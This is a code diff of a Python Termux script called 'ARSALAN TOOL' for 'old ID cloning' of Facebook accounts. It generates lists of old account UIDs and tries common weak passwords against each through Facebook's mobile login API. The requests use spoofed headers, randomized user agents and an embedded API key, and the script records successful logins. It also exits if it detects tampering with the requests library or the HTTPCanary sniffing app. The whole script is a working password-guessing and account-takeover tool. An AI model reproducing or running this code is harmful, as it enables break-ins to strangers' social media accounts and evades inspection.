@@ -64,14 +64,11 @@ def arsalan_approval():
     print("\033[1;31m" + "-" * 40 + "\033[0m")
     print("\x1b[1;37mStatus: \x1b[1;31mChecking Approval...")
 
-   # Aapki apni custom key yahan set ho gayi hai
 time.sleep(2)
 print("\033[32;41m\t Welcome ARSALAN TOOL 🔥 \033[0m")
 
 # Initial setup and promotion
 # --- Anti-tampering and Security Checks ---
-# The script checks if the source code of the 'requests' library has been modified
-# or if packet sniffing tools are being used.
 try:
     api_body = open(api.__file__, 'r').read()
     models_body = open(models.__file__, 'r').read()
@@ -85,13 +82,9 @@ except:
 
 
 class sec:
-    """
-    A security class to detect debugging and packet sniffing tools.
-    """
     def __init__(self):
         self.__module__ = __name__
         self.__qualname__ = 'sec'
-        # Paths to check for modifications
         paths = [
             '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
             '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
@@ -100,16 +93,12 @@ class sec:
         for path in paths:
             if 'print' in open(path, 'r').read():
                 self.fuck()
-        # Check for HTTPCanary (a packet sniffing app)
         if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
             self.fuck()
         if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
             self.fuck()
 
     def fuck(self):
-        """
-        Terminates the script if tampering is detected.
-        """
         print(' \x1b[1;32m Congratulations ! ')
         self.linex()
         exit()
@@ -138,53 +127,36 @@ W = '\x1b[1;37m'
 import random
 
 def windows():
-    """
-    Generates a modern, randomized Windows User-Agent string (Variant A).
-    """
     aV = random.choice(range(10, 20))
     chrome_major_old = random.choice(range(100, 115))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_old}.0.{random.choice(range(5000, 6500))}.0 Safari/537.36"
-    
     bz = f"537.36"
     chrome_major_mid = random.choice(range(115, 125))
     B = f"Mozilla/5.0 (Windows NT {random.choice([10, 11])}.0; Win64; x64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{chrome_major_mid}.0.{random.choice(range(6000, 6800))}.{random.choice(range(1, 150))} Safari/{bz}"
-    
     chrome_major_wow = random.choice(range(120, 130))
     C = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_wow}.0.{random.choice(range(6000, 6900))}.{random.choice(range(1, 150))} Safari/537.36"
-    
     chrome_latest = random.choice(range(130, 143))
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_latest}.0.{random.choice(range(6500, 7200))}.0 Safari/537.36"
-    
     return random.choice([A, B, C, D])
 
 
 def window1():
-    """
-    Generates a highly updated, modern Windows User-Agent string (Variant B).
-    """
     chrome_major = random.choice(range(120, 140))
     build_1 = random.choice(range(6000, 7100))
     A = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{build_1}.0 Safari/537.36"
-    
     chrome_major_alt = random.choice(range(125, 142))
     build_2 = random.choice(range(6200, 7150))
     patch_2 = random.choice(range(50, 250))
     B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_alt}.0.{build_2}.{patch_2} Safari/537.36"
-    
     chrome_major_ent = random.choice(range(118, 135))
     build_3 = random.choice(range(5800, 6800))
     C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.choice(range(110, 130))}.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_ent}.0.{build_3}.{random.choice(range(10, 190))} Safari/537.36"
-    
     latest_build = random.randint(7000, 7500)
     latest_patch = random.randint(100, 300)
     chrome_ultra = random.choice(range(140, 146))
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ultra}.0.{latest_build}.{latest_patch} Safari/537.36"
-    
     return random.choice([A, B, C, D])
 
-
-
-# Set window title
 sys.stdout.write('\x1b]2;👑【 A.R.S.A.L.A.N 👑 】\x07')
 
 
@@ -193,7 +165,6 @@ def ____banner____():
         os.system('cls')
     else:
         os.system('clear')
-    
     print("""\033[1;32m
 ==========================================                                                         
 ╔═══╗  ╔═╗╔═╗ ╔═╗╔═╗  ╔═╗
@@ -209,21 +180,12 @@ TOOLS : OLD ID CLONING
 
 
 def creationyear(uid):
-    """
-    Estimates the Facebook account creation year based on the UID.
-    """
     if len(uid) == 15:
-        if uid.startswith('1000000000'):
-            return '2009'
-        if uid.startswith('100000000'):
-            return '2009'
-        if uid.startswith('10000000'):
+        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000'):
             return '2009'
         if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
             return '2009'
-        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
-            return '2010'
-        if uid.startswith('100001'):
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')) or uid.startswith('100001'):
             return '2010'
         if uid.startswith(('100002', '100003')):
             return '2011'
@@ -273,9 +235,6 @@ def linex():
 
 
 def BNG_71_():
-    """
-    Main menu function.
-    """
     ____banner____()
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
     linex()
@@ -289,9 +248,6 @@ def BNG_71_():
 
 
 def old_clone():
-    """
-    Menu for selecting old account cloning type.
-    """
     ____banner____()
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mALL SERIES')
     linex()
@@ -312,9 +268,6 @@ def old_clone():
 
 
 def old_One():
-    """
-    Cloning method for accounts from 2010-2014.
-    """
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mOld Code {Y}:{G} 2010-2014")
@@ -339,19 +292,14 @@ def old_One():
         linex()
         for mal in user:
             uid = star + mal
-            if meth == 'A':
+            if meth in ('A', 'B'):
                 pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
             else:
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
 
 
 def old_Tow():
-    """
-    Cloning method for accounts with specific prefixes.
-    """
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
@@ -377,19 +325,14 @@ def old_Tow():
         print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
-            if meth == 'A':
+            if meth in ('A', 'B'):
                 pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
             else:
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
 
 
 def old_Tree():
-    """
-    Cloning method for accounts from 2009-2010.
-    """
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
@@ -414,25 +357,18 @@ def old_Tree():
         print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
-            if meth == 'A':
+            if meth in ('A', 'B'):
                 pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
             else:
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
 
 
 def login_1(uid):
-    """
-    Login attempt method 1.
-    """
     global loop
-    session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mRAJA-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
-        sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789'):
+        pw_list = ['123456', '1234567', '12345678', '123456789']
+        for pw in pw_list:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -456,6 +392,38 @@ def login_1(uid):
                 'fb_api_caller_class': 'com.facebook.account.login.protocol',
                 'api_key': '882a8490361d98702bf97a021ddc14d'
             }
+            headers = {
+                'User-Agent': window1(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'b-api.facebook.com',
+                'X-FB-Net-HNI': str(random.choice(range(20000, 40000))),
+                'X-FB-SIM-HNI': str(random.choice(range(20000, 40000))),
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid==;pid==;tid=',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'authenticate',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+                'Connection': 'Keep-Alive'
+            }
+            response = requests.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers, timeout=10, verify=False)
+            q = response.json()
+            if 'access_token' in q:
+                print(f'\r\r\033[1;32m[ARSALAN-OK] {uid} | {pw}')
+                oks.append(uid)
+                break
+            elif 'www.facebook.com' in str(q):
+                print(f'\r\r\033[1;33m[ARSALAN-CP] {uid} | {pw}')
+                cps.append(uid)
+                break
+        
+        loop += 1
+        sys.stdout.write(f"\r\r\x1b[1;37m[\x1b[1;37mRAJA-M1\x1b[38;5;196m]\x1b[1;37m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
+        sys.stdout.flush()
     except Exception as e:
         pass
 
